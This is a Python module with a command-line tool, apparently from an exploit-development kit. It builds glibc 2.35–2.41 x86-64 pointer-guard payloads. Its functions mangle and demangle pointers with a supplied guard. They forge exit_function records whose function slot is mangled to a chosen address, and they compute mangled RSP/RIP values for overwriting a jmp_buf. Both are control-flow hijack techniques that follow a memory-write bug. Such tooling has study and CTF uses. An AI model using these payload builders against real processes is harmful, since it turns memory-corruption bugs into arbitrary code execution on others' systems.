#!/usr/bin/env python3
"""Offline x86-64 glibc pointer-guard plans for the 2.35--2.41 range.

glibc's x86-64 ``PTR_MANGLE`` is deliberately kept separate from heap
Safe-Linking: it XORs a pointer with the caller-supplied thread pointer guard
and rotates the result left by 17 bits.  This module never discovers a guard,
reads a process, executes input, or delivers a write.  It only serializes and
checks caller-addressed slots for an already-proven write primitive.
"""
from __future__ import annotations

import argparse
import json
import re
import struct
import sys
from dataclasses import dataclass
from typing import Sequence


MASK64 = (1 << 64) - 1
PTR_MANGLE_ROTATION = 17
MIN_GLIBC_MINOR = 35
MAX_GLIBC_MINOR = 41
EXIT_FUNCTION_SIZE = 0x20


class PwnDepthPointerGuardError(ValueError):
    """Malformed, ambiguous, or unsupported pointer-guard plan input."""


@dataclass(frozen=True)
class MangledSlotPlan:
    glibc_version: str
    purpose: str
    slot_address: int
    pointer: int
    pointer_guard: int
    stored_value: int
    payload: bytes

    def as_dict(self) -> dict[str, object]:
        return {
            "glibc_version": self.glibc_version,
            "purpose": self.purpose,
            "slot_address": hex(self.slot_address),
            "pointer": hex(self.pointer),
            "pointer_guard": hex(self.pointer_guard),
            "stored_value": hex(self.stored_value),
            "payload_hex": self.payload.hex(),
            "transform": "ROL64(pointer XOR pointer_guard, 17)",
            "delivery": "none",
        }


@dataclass(frozen=True)
class ExitFunctionPlan:
    glibc_version: str
    flavor: str
    entry_address: int
    function_address: int
    argument_address: int
    dso_handle: int
    pointer_guard: int
    mangled_function: int
    payload: bytes
    placements: tuple[tuple[str, int], ...]
    constraints: tuple[str, ...]

    def as_dict(self) -> dict[str, object]:
        return {
            "glibc_version": self.glibc_version,
            "flavor": self.flavor,
            "entry_address": hex(self.entry_address),
            "function_address": hex(self.function_address),
            "argument_address": hex(self.argument_address),
            "dso_handle": hex(self.dso_handle),
            "pointer_guard": hex(self.pointer_guard),
            "mangled_function": hex(self.mangled_function),
            "payload_hex": self.payload.hex(),
            "placements": {name: offset for name, offset in self.placements},
            "constraints": list(self.constraints),
            "delivery": "none",
        }


@dataclass(frozen=True)
class JmpBufControlPlan:
    glibc_version: str
    rsp_slot_address: int
    rip_slot_address: int
    saved_rsp: int
    saved_rip: int
    pointer_guard: int
    rsp_payload: bytes
    rip_payload: bytes
    constraints: tuple[str, ...]

    def as_dict(self) -> dict[str, object]:
        return {
            "glibc_version": self.glibc_version,
            "writes": [
                {"address": hex(self.rsp_slot_address), "data_hex": self.rsp_payload.hex(), "field": "rsp"},
                {"address": hex(self.rip_slot_address), "data_hex": self.rip_payload.hex(), "field": "rip"},
            ],
            "saved_rsp": hex(self.saved_rsp),
            "saved_rip": hex(self.saved_rip),
            "pointer_guard": hex(self.pointer_guard),
            "constraints": list(self.constraints),
            "delivery": "none",
        }


_FLAVORS = {"ef_on": 2, "ef_at": 3, "ef_cxa": 4}


def _version(value: object) -> str:
    if not isinstance(value, str) or len(value) > 32:
        raise PwnDepthPointerGuardError("glibc_version must be a short 2.MINOR string")
    match = re.fullmatch(r"2\.(\d{2})(?:\.\d+)?", value)
    if match is None:
        raise PwnDepthPointerGuardError("glibc_version must be 2.MINOR")
    minor = int(match.group(1))
    if not MIN_GLIBC_MINOR <= minor <= MAX_GLIBC_MINOR:
        raise PwnDepthPointerGuardError("supported glibc range is 2.35 through 2.41")
    return f"2.{minor}"


def _u64(value: object, name: str) -> int:
    if isinstance(value, bool) or not isinstance(value, int) or not 0 <= value <= MASK64:
        raise PwnDepthPointerGuardError(f"{name} must be an unsigned 64-bit integer")
    return value


def _canonical(value: object, name: str, *, allow_zero: bool = False) -> int:
    result = _u64(value, name)
    if not allow_zero and result == 0:
        raise PwnDepthPointerGuardError(f"{name} must be non-zero")
    if result:
        high = result >> 48
        sign = (result >> 47) & 1
        if high != (0xFFFF if sign else 0):
            raise PwnDepthPointerGuardError(f"{name} is not a canonical x86-64 address")
    return result


def _rol64(value: int, count: int) -> int:
    count &= 63
    return ((value << count) | (value >> ((64 - count) & 63))) & MASK64


def _ror64(value: int, count: int) -> int:
    count &= 63
    return ((value >> count) | (value << ((64 - count) & 63))) & MASK64


def mangle_pointer(pointer: int, pointer_guard: int) -> int:
    """Apply glibc x86-64 ``PTR_MANGLE`` to one explicit pointer value."""
    try:
        ptr = _u64(pointer, "pointer")
        guard = _u64(pointer_guard, "pointer_guard")
        return _rol64(ptr ^ guard, PTR_MANGLE_ROTATION)
    except PwnDepthPointerGuardError:
        raise
    except Exception as exc:  # pragma: no cover - defensive public boundary
        raise PwnDepthPointerGuardError("could not mangle pointer") from exc


def demangle_pointer(stored_value: int, pointer_guard: int) -> int:
    """Invert glibc x86-64 ``PTR_MANGLE`` with an explicitly known guard."""
    try:
        stored = _u64(stored_value, "stored_value")
        guard = _u64(pointer_guard, "pointer_guard")
        return _ror64(stored, PTR_MANGLE_ROTATION) ^ guard
    except PwnDepthPointerGuardError:
        raise
    except Exception as exc:  # pragma: no cover - defensive public boundary
        raise PwnDepthPointerGuardError("could not demangle pointer") from exc


def build_mangled_slot_plan(
    *, glibc_version: str, slot_address: int, pointer: int,
    pointer_guard: int, purpose: str = "control-pointer",
) -> MangledSlotPlan:
    """Serialize one mangled qword for a caller-selected writable slot."""
    try:
        version = _version(glibc_version)
        slot = _canonical(slot_address, "slot_address")
        ptr = _canonical(pointer, "pointer", allow_zero=True)
        guard = _u64(pointer_guard, "pointer_guard")
        if slot & 7:
            raise PwnDepthPointerGuardError("slot_address must be qword aligned")
        if not isinstance(purpose, str) or not purpose or len(purpose) > 128:
            raise PwnDepthPointerGuardError("purpose must be 1..128 characters")
        stored = mangle_pointer(ptr, guard)
        return MangledSlotPlan(version, purpose, slot, ptr, guard, stored, struct.pack("<Q", stored))
    except PwnDepthPointerGuardError:
        raise
    except (OverflowError, struct.error, TypeError, ValueError) as exc:
        raise PwnDepthPointerGuardError("invalid mangled-slot plan") from exc


def verify_mangled_slot(
    data: bytes, *, glibc_version: str, slot_address: int,
    expected_pointer: int, pointer_guard: int,
) -> bool:
    """Fail closed unless an exact eight-byte slot demangles to the expected pointer."""
    try:
        _version(glibc_version)
        slot = _canonical(slot_address, "slot_address")
        expected = _canonical(expected_pointer, "expected_pointer", allow_zero=True)
        guard = _u64(pointer_guard, "pointer_guard")
        if slot & 7:
            raise PwnDepthPointerGuardError("slot_address must be qword aligned")
        if not isinstance(data, bytes) or len(data) != 8:
            raise PwnDepthPointerGuardError("mangled slot must be exactly eight immutable bytes")
        stored = int.from_bytes(data, "little")
        if demangle_pointer(stored, guard) != expected:
            raise PwnDepthPointerGuardError("mangled slot does not decode to expected_pointer")
        return True
    except PwnDepthPointerGuardError:
        raise
    except Exception as exc:  # pragma: no cover
        raise PwnDepthPointerGuardError("invalid mangled slot") from exc


def build_exit_function_plan(
    *, glibc_version: str, entry_address: int, function_address: int,
    pointer_guard: int, flavor: str = "ef_cxa", argument_address: int = 0,
    dso_handle: int = 0,
) -> ExitFunctionPlan:
    """Build one amd64 ``exit_function`` record with a mangled function slot.

    Offsets are the published LP64 glibc union layout: flavor at 0, function
    at 8, argument at 16, and ``dso_handle`` at 24.  Every runtime address is
    supplied by the caller; the function does not locate ``__exit_funcs``.
    """
    try:
        version = _version(glibc_version)
        entry = _canonical(entry_address, "entry_address")
        function = _canonical(function_address, "function_address")
        guard = _u64(pointer_guard, "pointer_guard")
        argument = _canonical(argument_address, "argument_address", allow_zero=True)
        dso = _canonical(dso_handle, "dso_handle", allow_zero=True)
        if entry & 7:
            raise PwnDepthPointerGuardError("entry_address must be qword aligned")
        if flavor not in _FLAVORS:
            raise PwnDepthPointerGuardError("flavor must be ef_at, ef_on, or ef_cxa")
        if flavor == "ef_at" and (argument or dso):
            raise PwnDepthPointerGuardError("ef_at has no argument or dso_handle")
        if flavor == "ef_on" and dso:
            raise PwnDepthPointerGuardError("ef_on has no dso_handle")
        mangled = mangle_pointer(function, guard)
        payload = struct.pack("<QQQQ", _FLAVORS[flavor], mangled, argument, dso)
        constraints = (
            "pointer_guard is an independently recovered value from this exact process",
            "entry_address identifies a writable exit_function slot in the exact libc state",
            "the selected flavor matches the eventual __run_exit_handlers call ABI",
            "the exit list linkage/count and trigger are established separately",
        )
        return ExitFunctionPlan(
            version, flavor, entry, function, argument, dso, guard, mangled, payload,
            (("flavor", 0), ("mangled_function", 8), ("argument", 16), ("dso_handle", 24)),
            constraints,
        )
    except PwnDepthPointerGuardError:
        raise
    except (OverflowError, struct.error, TypeError, ValueError) as exc:
        raise PwnDepthPointerGuardError("invalid exit-function plan") from exc


def verify_exit_function(
    data: bytes, *, glibc_version: str, entry_address: int,
    expected_function: int, pointer_guard: int, flavor: str = "ef_cxa",
    expected_argument: int = 0, expected_dso_handle: int = 0,
) -> bool:
    """Inverse-check one exact LP64 exit-function record."""
    try:
        expected = build_exit_function_plan(
            glibc_version=glibc_version, entry_address=entry_address,
            function_address=expected_function, pointer_guard=pointer_guard,
            flavor=flavor, argument_address=expected_argument,
            dso_handle=expected_dso_handle,
        )
        if not isinstance(data, bytes) or len(data) != EXIT_FUNCTION_SIZE:
            raise PwnDepthPointerGuardError("exit-function record must be exactly 32 immutable bytes")
        flavor_value, mangled, argument, dso = struct.unpack("<QQQQ", data)
        if flavor_value != _FLAVORS[flavor]:
            raise PwnDepthPointerGuardError("exit-function flavor does not match")
        if demangle_pointer(mangled, expected.pointer_guard) != expected.function_address:
            raise PwnDepthPointerGuardError("exit function does not demangle to expected_function")
        if argument != expected.argument_address or dso != expected.dso_handle:
            raise PwnDepthPointerGuardError("exit-function argument fields do not match")
        return True
    except PwnDepthPointerGuardError:
        raise
    except (struct.error, OverflowError, TypeError, ValueError) as exc:
        raise PwnDepthPointerGuardError("invalid exit-function record") from exc


def build_jmpbuf_control_plan(
    *, glibc_version: str, rsp_slot_address: int, rip_slot_address: int,
    saved_rsp: int, saved_rip: int, pointer_guard: int,
) -> JmpBufControlPlan:
    """Plan only the mangled RSP/RIP writes for a caller-profiled ``jmp_buf``.

    The caller supplies the two private slot addresses instead of this module
    assuming ``JB_RSP``/``JB_PC`` indexes for an unknown architecture/build.
    """
    try:
        version = _version(glibc_version)
        rsp_slot = _canonical(rsp_slot_address, "rsp_slot_address")
        rip_slot = _canonical(rip_slot_address, "rip_slot_address")
        rsp = _canonical(saved_rsp, "saved_rsp")
        rip = _canonical(saved_rip, "saved_rip")
        guard = _u64(pointer_guard, "pointer_guard")
        if rsp_slot == rip_slot or rsp_slot & 7 or rip_slot & 7:
            raise PwnDepthPointerGuardError("RSP/RIP slots must be distinct qword-aligned addresses")
        if rsp & 7:
            raise PwnDepthPointerGuardError("saved_rsp must be at least qword aligned")
        rsp_payload = struct.pack("<Q", mangle_pointer(rsp, guard))
        rip_payload = struct.pack("<Q", mangle_pointer(rip, guard))
        return JmpBufControlPlan(
            version, rsp_slot, rip_slot, rsp, rip, guard, rsp_payload, rip_payload,
            (
                "slot addresses come from the exact x86-64 libc jmp_buf layout",
                "the separately mangled saved-RBP slot and all other preserved registers remain valid",
                "signal-mask state remains valid for the selected setjmp/longjmp flavor",
                "the longjmp caller and target stack obey the SysV ABI",
                "CET shadow-stack state is absent or independently synchronized for this exact runtime",
            ),
        )
    except PwnDepthPointerGuardError:
        raise
    except (OverflowError, struct.error, TypeError, ValueError) as exc:
        raise PwnDepthPointerGuardError("invalid jmp_buf control plan") from exc


def verify_jmpbuf_control(
    rsp_data: bytes, rip_data: bytes, *, glibc_version: str,
    rsp_slot_address: int, rip_slot_address: int, saved_rsp: int,
    saved_rip: int, pointer_guard: int,
) -> bool:
    """Inverse-check the two caller-profiled mangled control slots."""
    try:
        plan = build_jmpbuf_control_plan(
            glibc_version=glibc_version, rsp_slot_address=rsp_slot_address,
            rip_slot_address=rip_slot_address, saved_rsp=saved_rsp,
            saved_rip=saved_rip, pointer_guard=pointer_guard,
        )
        verify_mangled_slot(
            rsp_data, glibc_version=plan.glibc_version,
            slot_address=plan.rsp_slot_address, expected_pointer=plan.saved_rsp,
            pointer_guard=plan.pointer_guard,
        )
        verify_mangled_slot(
            rip_data, glibc_version=plan.glibc_version,
            slot_address=plan.rip_slot_address, expected_pointer=plan.saved_rip,
            pointer_guard=plan.pointer_guard,
        )
        return True
    except PwnDepthPointerGuardError:
        raise
    except Exception as exc:  # pragma: no cover
        raise PwnDepthPointerGuardError("invalid jmp_buf control record") from exc


def _parse_int(text: str) -> int:
    try:
        return int(text, 0)
    except (TypeError, ValueError) as exc:
        raise PwnDepthPointerGuardError(f"invalid integer: {text!r}") from exc


def _parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="pwndepth_pointer_guard.py")
    sub = parser.add_subparsers(dest="command", required=True)
    for command in ("mangle", "demangle"):
        item = sub.add_parser(command)
        item.add_argument("value")
        item.add_argument("guard")
    exit_item = sub.add_parser("exit-plan")
    exit_item.add_argument("version")
    exit_item.add_argument("entry")
    exit_item.add_argument("function")
    exit_item.add_argument("guard")
    exit_item.add_argument("--flavor", choices=tuple(_FLAVORS), default="ef_cxa")
    exit_item.add_argument("--argument", default="0")
    exit_item.add_argument("--dso-handle", default="0")
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    try:
        try:
            args = _parser().parse_args(argv)
        except SystemExit as exc:
            return exc.code if isinstance(exc.code, int) else 2
        if args.command == "mangle":
            print(hex(mangle_pointer(_parse_int(args.value), _parse_int(args.guard))))
        elif args.command == "demangle":
            print(hex(demangle_pointer(_parse_int(args.value), _parse_int(args.guard))))
        elif args.command == "exit-plan":
            result = build_exit_function_plan(
                glibc_version=args.version, entry_address=_parse_int(args.entry),
                function_address=_parse_int(args.function),
                pointer_guard=_parse_int(args.guard), flavor=args.flavor,
                argument_address=_parse_int(args.argument),
                dso_handle=_parse_int(args.dso_handle),
            )
            print(json.dumps(result.as_dict(), sort_keys=True))
        else:  # pragma: no cover - argparse makes this unreachable
            raise PwnDepthPointerGuardError("unknown command")
        return 0
    except PwnDepthPointerGuardError as exc:
        print(f"pwndepth_pointer_guard: {exc}", file=sys.stderr)
        return 2
    except (OverflowError, struct.error, TypeError, ValueError) as exc:  # fail-closed boundary
        print(f"pwndepth_pointer_guard: invalid input: {exc}", file=sys.stderr)
        return 2


__all__ = [
    "EXIT_FUNCTION_SIZE", "JmpBufControlPlan", "MangledSlotPlan",
    "PTR_MANGLE_ROTATION", "PwnDepthPointerGuardError", "ExitFunctionPlan",
    "build_exit_function_plan", "build_jmpbuf_control_plan",
    "build_mangled_slot_plan", "demangle_pointer", "mangle_pointer",
    "verify_exit_function", "verify_jmpbuf_control", "verify_mangled_slot",
]


if __name__ == "__main__":
    raise SystemExit(main())
